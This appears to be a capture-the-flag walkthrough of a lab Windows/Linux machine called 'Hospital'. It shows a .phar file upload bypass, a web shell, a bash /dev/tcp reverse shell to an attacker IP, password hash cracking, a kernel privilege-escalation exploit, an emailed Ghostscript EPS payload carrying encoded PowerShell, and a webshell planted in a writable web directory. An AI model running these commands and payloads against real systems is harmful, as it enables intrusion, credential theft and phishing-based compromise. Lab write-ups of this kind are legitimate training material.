![image](https://github.com/user-attachments/assets/dd5eae04-673e-4f96-bf5c-b48e04133082)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration

## Port scan:

I kicked things off with a port and service scan using `rustscan` for speed and depth. This helped uncover the open ports and running services on the target machine:

```
rustscan -a 10.10.11.241 -- -sC -sV -T4 -oN hospital_nmap
```

![image](https://github.com/user-attachments/assets/4179ee42-e792-4626-9d89-b6cca1f766cf)

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-04-20 18:15:13Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?      syn-ack
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
1801/tcp  open  msmq?         syn-ack
2103/tcp  open  msrpc         syn-ack Microsoft Windows RPC
2105/tcp  open  msrpc         syn-ack Microsoft Windows RPC
2107/tcp  open  msrpc         syn-ack Microsoft Windows RPC
2179/tcp  open  vmrdp?        syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp  open  msrpc         syn-ack Microsoft Windows RPC
6406/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc         syn-ack Microsoft Windows RPC
6409/tcp  open  msrpc         syn-ack Microsoft Windows RPC
6613/tcp  open  msrpc         syn-ack Microsoft Windows RPC
6633/tcp  open  msrpc         syn-ack Microsoft Windows RPC
8080/tcp  open  http          syn-ack Apache httpd 2.4.55 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
28026/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-20T18:16:26
|_  start_date: N/A
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23222/tcp): CLEAN (Timeout)
|   Check 2 (port 10822/tcp): CLEAN (Timeout)
|   Check 3 (port 23197/udp): CLEAN (Timeout)
|   Check 4 (port 18274/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

From the results, I spotted two interesting domains in the output: `DC.hospital.htb` and `hospital.htb`. I quickly added both of them to my `/etc/hosts` file for cleaner resolution throughout the engagement.

## Web enumeration:

### Roundcube Webmail (Port 443)

I proceeded with enumeration on the two web applications running on ports 443 and 8080. Upon accessing port 443, I found the target running **Roundcube Webmail**, a popular open-source webmail application.

![image](https://github.com/user-attachments/assets/9ad1024a-55a2-4040-ae61-28fa973126e9)

I initially tried common default credentials like `admin:admin` and `hospital:hospital`, but these didn’t give me access to the Roundcube webmail.

### Hospital Application (Port 8080)

Moving to port 8080, I found another login page tied to the hospital application.

![image](https://github.com/user-attachments/assets/01e4c4e5-33f9-4940-927c-2d10ea8ec326)

I repeated the same approach, testing common default credentials like `admin:admin` and `hospital:hospital`, but no luck here either.

### Directory search

To dig deeper, I ran directory enumeration with dirsearch on the Roundcube application and another application, but the results didn't showed anything helpful.

![image](https://github.com/user-attachments/assets/6ffd9fe8-268f-4a5d-9c38-137538156e84)

![image](https://github.com/user-attachments/assets/a551f73f-d196-4795-b2d1-ba9b3bdd2e26)

So, I registered myself on the hospital application with credentails `peter:password` and logged in with it.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial access

## File upload bypass:

Once logged into the hospital application, I noticed a feature to upload prescriptions. Classic entry point for testing file upload restrictions:

![image](https://github.com/user-attachments/assets/e0ee8297-ce68-4090-bd57-454c098a1846)

Naturally, I tried uploading a basic `php` web shell. The app immediately rejected it—looks like some level of file type filtering was in place:

![image](https://github.com/user-attachments/assets/ec2e3320-699e-4f21-ad8a-0276f522d126)

Then I uploaded a harmless `.jpg` image, and it worked fine—upload went through without a hitch:

![image](https://github.com/user-attachments/assets/5d0d8589-d387-44ee-9c46-1050de0f805e)

### Exploring Alternative Extensions

At this point, I turned to the usual bag of tricks—searching for extensions that might **bypass PHP filters**. I consulted the ever-helpful [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html) file upload section:

![image](https://github.com/user-attachments/assets/028ee2cf-de5b-4db2-9e23-b2f729d23c00)

I tested each extension methodically—`.php3`, `.phtml`, `.pht`, `.phps`... most were rejected.

But then came `.phar`.

Uploading a `.phar` payload didn’t throw an error. Instead, it returned a blank page, a subtle but promising sign:

![image](https://github.com/user-attachments/assets/8bdb8fc7-bdd4-4e32-91c5-bb9c7433b3c5)

This suggested the server likely executed the file or at least processed it differently than a regular image. Time to dig deeper and hunt for the file path to access it. 

## Shell as www-data:

Once I confirmed that `.phar` extensions were accepted, I experimented with a few different PHP shells. After testing a couple of payloads, I landed on the [p0wny-shell](https://github.com/flozz/p0wny-shell/tree/master) — a compact, interactive web shell that worked flawlessly upon upload.

Running basic enumeration confirmed initial access as the `www-data` user:

![image](https://github.com/user-attachments/assets/02470b5a-b3aa-45ec-9bed-1b71df795678)

To get more flexibility, I opted for a proper reverse shell using good ol' Netcat. I fired up a listener:

```
nc -nlvp 1337
```

Then from the p0wny-shell, I executed:

```
bash -c "bash -i >& /dev/tcp/10.10.14.45/1337 0>&1"
```

Once the bash command got executed successfully, I quickly received a reverse shell:

![image](https://github.com/user-attachments/assets/de7ae0b7-2ea6-4627-9906-25513ed0fa0c)

To avoid the pain of a janky shell session, I stabilized it using:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm

Then backgrounded and re-foregrounded the shell cleanly:

$ stty raw -echo; fg
```

![image](https://github.com/user-attachments/assets/02aa11d0-f919-4070-a7de-2ca20a4beea8)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement:

## Mysql
With a stable shell as `www-data`, I began hunting for sensitive files. A quick peek inside /var/www/html revealed a promising lead — a `config.php` file.

Inside the file, I struck gold: **MySQL root credentials**.

![image](https://github.com/user-attachments/assets/a93539da-867d-4b95-a3cc-2a05332b2d72)

Using the extracted credentials, I logged into MySQL. Browsing through the available databases, I came across a familiar name: **hospital**.

![image](https://github.com/user-attachments/assets/f358d157-9f6d-4009-9796-5362ffff8568)

This database contains a table `users` and this contains user details along with their password hash:

![image](https://github.com/user-attachments/assets/b682f63a-280d-4107-b14a-335dc9bee0bc)

I dumped the hashes and ran them through hashcat and john. Two out of three cracked successfully — but unfortunately, none of the cracked passwords were valid for SSH, web login, or any other known services on the host.

## Shell as root:

After hitting a wall with the cracked MySQL passwords, I shifted gears and ran `linpeas` to scout for local privilege escalation opportunities. While it uncovered some minor misconfigs, nothing stood out as a clear escalation vector.

Next, I checked the kernel version, which is running on `5.19.0-35-generic`:

![image](https://github.com/user-attachments/assets/f6ea34a7-3996-468c-a54d-d3faa3d78d9d)

A quick Google search on known exploits for this version led me to a promising vulnerability — CVE-2023-35001, an out-of-bounds read/write vulnerability in the Linux kernel. I cloned the PoC from [Synacktiv’s GitHub](https://github.com/synacktiv/CVE-2023-35001/tree/master), compiled it on my attacker machine, and transferred both the `exploit` and `wrapper` binaries to the target host.

Once on the target, I made the binaries executable and ran the exploit:

![image](https://github.com/user-attachments/assets/de3809d0-7c76-4fdb-b989-d6239afbd08a)

## Root -> drwilliams:

Once I had root access, I headed straight to the `/home` directory. There was only one user present — `drwilliams`.

![image](https://github.com/user-attachments/assets/7eee5cc9-a943-48c7-a77a-ba012550ac0d)

The user folder didn’t contain any juicy credentials or SSH keys, so I went ahead and checked the `/etc/shadow` file. Thankfully, `drwilliams's` hash was present:

![image](https://github.com/user-attachments/assets/2dd53bb4-0f88-4138-989a-17e07afc22f4)

I copied the hash over to my machine and ran `hashcat` using mode `1800` to crack it — and boom! Got the clear-text password:

![image](https://github.com/user-attachments/assets/867005c2-0937-4214-8b59-4bb3191c2ecb)

Tried the credentials using `netexec` with the username `drwilliams`, and this time it worked like a charm:

![image](https://github.com/user-attachments/assets/89d31813-44ab-4ae4-ad31-1c5decb9849c)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# drwilliams -> drbrown

After obtaining valid credentials for `drwilliams`, I attempted to login using `evil-winrm` since port 5985 was open. However, the login attempt failed with an "unauthorized" error:

![image](https://github.com/user-attachments/assets/6553f4c9-301a-4cfa-a752-eda1798f2f46)

I then moved on to try `AS-REP roasting` and `Kerberoasting` techniques to extract TGT or service ticket hashes for any users that had pre-auth disabled or SPNs set — but both attempts failed as there were no users with those attributes:

![image](https://github.com/user-attachments/assets/aea8f2b2-982a-45b1-b996-746a3e8da3a6)

![image](https://github.com/user-attachments/assets/2083e17a-eb7c-4c59-8d45-e5fd02811bd7)

Next, I ran a user enumeration to identify other active users on the network. Besides the administrator, I only discovered two users — `drwilliams` and `drbrown`:

![image](https://github.com/user-attachments/assets/c0ad539b-4935-4cf6-beb1-5d0462d98837)

## Bloodhound

Next, I used BloodHound to enumerate and map out the Active Directory environment for a clearer, graphical overview:

```
bloodhound-python -u drwilliams -p '*******' -d hospital.htb -dc dc.hospital.htb -ns 10.10.11.241 -c All --zip --dns-timeout 30
```

![image](https://github.com/user-attachments/assets/0c753c76-3720-464c-897e-24f14c1c69ec)

Upon analyzing the BloodHound graph, I was unable to identify any clear paths to escalate privileges, as `drwilliams` didn’t possess any special rights that could facilitate a move toward administrator access:

![image](https://github.com/user-attachments/assets/dcdca6d5-0cdf-44bf-9962-1859ea7d57e6)

## Roundcube web mail

Next, I attempted to log in using the `drwilliams` credentials, and this time, I successfully gained access. Upon logging in, I found an email from `drbrown` in the inbox:

![image](https://github.com/user-attachments/assets/128dea3c-75bf-4c24-b444-022a4bcc76e9)

The email contained discussions about some design work, with a mention that the file format should be ".eps."

I hypothesized that there could be an exploit related to the ".**EPS**" extension and "**Ghostwriter**." After some searching, I found an exploit on [GitHub](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/tree/main), which demonstrated how to perform command injection in Ghostwriter.

I cloned the repository, prepared a new EPS-based reverse shell payload:

```
python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQBlAG......." --filename run_calculator --extension eps
```

![image](https://github.com/user-attachments/assets/6172710a-6861-46e8-888f-3b13b5f0175f)

Once the file was ready, I sent it to `drbrown` via email:

![image](https://github.com/user-attachments/assets/fd08aded-9574-499e-8f40-e40340191cdf)

With my netcat listener active and waiting, it didn't take long before I received a reverse shell from `drbrown`:

![image](https://github.com/user-attachments/assets/7d6ee7bd-cee5-47eb-9274-aac0a27d0786)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# DrBrown -> Administrator:

## Situational Awareness

After gaining the shell, I quickly set up `Villian C2` to establish another session and used `conpty shell` for better auto-completion:

![image](https://github.com/user-attachments/assets/e18b5122-251a-43fc-8f98-bd32912cd208)

Once I had the second session, I began enumerating the system. Inside the `documents` directory, I found a file named `ghostscript.bat`. Upon analyzing the script, I found clear-text credentials for `drbrown`:

![image](https://github.com/user-attachments/assets/922ad7b9-1f96-4454-b99d-5d6f232e5c5c)

I then checked the privileges assigned to `drbrown`, but I didn’t find anything noteworthy that could help escalate privileges:

![image](https://github.com/user-attachments/assets/4f2d86bb-c6d3-433e-9696-6943bbb86058)

Even after reviewing the BloodHound data, I couldn’t find any useful escalation paths:

![image](https://github.com/user-attachments/assets/85176085-d375-4448-aaa6-f82174d77583)

## Xampp php shell:

I continued my analysis from the root directory, where I found the following files:

![image](https://github.com/user-attachments/assets/b7709fdb-e5fb-4976-846c-371b5d0f2a0f)

Upon inspecting each of these, I discovered that the `xampp` directory was hosting the RoundCube mail application. This was evident from the content of the `C:\Xampp\htdocs\index.php` file:

![image](https://github.com/user-attachments/assets/0d2f30b1-9548-495f-b68d-7c5e4db8f5d0)

Next, I checked the permissions in this directory and found that any user could write a file here:

![image](https://github.com/user-attachments/assets/f60d94d8-8a78-4f87-b0f7-38778d470a16)

I exploited this misconfiguration and uploaded the `p0wny` webshell into this directory. After uploading the file, I accessed the webshell and discovered that the RoundCube application was running under `NT Authority\System` privileges:

![image](https://github.com/user-attachments/assets/5fda897c-d5be-4070-ad27-6d54b21ba794)

Using this shell, I was able to successfully retrieve both the user and root flags.(pwn3d!🎉)🙂
